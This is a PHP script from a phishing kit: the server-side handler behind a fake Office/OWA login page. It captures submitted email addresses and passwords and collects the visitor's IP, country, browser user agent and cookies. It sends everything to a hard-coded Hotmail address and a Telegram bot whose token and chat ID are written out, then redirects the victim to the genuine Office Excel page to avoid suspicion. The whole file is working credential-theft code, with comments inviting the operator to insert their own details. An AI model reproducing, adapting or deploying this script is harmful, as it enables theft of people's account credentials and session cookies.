<?php

$redirect = 'https://office.live.com/start/Excel.aspx';

header('Access-Control-Allow-Origin: *');

if(isset($_POST['email']) && isset($_POST['password'])) {

    function visitor_country() {
        $ip = getenv("REMOTE_ADDR");
        $result = "Unknown";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $country = json_decode(curl_exec($ch))->country;
        if ($country != null) {
            $result = $country;
        }

        return $result;
    }

    $email = $_POST['email'];
    $password = $_POST['password'];
    $recipient = "son_of_grace@hotmail.com"; // Replace your email id here
    $country = visitor_country();
    $ip = getenv("REMOTE_ADDR");

    // Retrieve user agent (browser)
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Retrieve cookies
    $cookies = json_encode($_COOKIE);

    // Compose email message
    $date = date('d-m-Y');
    $message = "-----------------++-----------------\n";
    $message .= "User ID: " . $email . "\n";
    $message .= "Password: " . $password . "\n";
    $message .= "Client IP      : $ip\n";
    $message .= "Client Country      : $country\n";
    $message .= "User Agent (Browser): $userAgent\n";
    $message .= "Cookies: $cookies\n";
    $message .= "-----------------++-----------------\n";
    $subject = "OWA | Login" . $ip . "\n";
    $headers = "MIME-Version: 1.0\n";

    // Send email
    mail($recipient, $subject, $message, $headers);

    // Send message to Telegram bot
    $botToken = '6545817893:AAGORFKAzo6VGvT4nKWyR1dJNjEogLd4ozc'; // Replace with your actual bot token
    $chatId = '-4790843102'; // Replace with your actual chat ID
    $telegramMessage = "OWA Login Alert\n-------------------------\nUser ID: $email\nPassword: $password\nClient IP: $ip\nClient Country: $country\nUser Agent (Browser): $userAgent\nCookies: $cookies";

    $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($telegramMessage);
    file_get_contents($telegramApiUrl); // Send message using file_get_contents (consider using curl for better error handling)

    // Redirect user
    header("Location: " . $redirect);
    exit();
}
?>
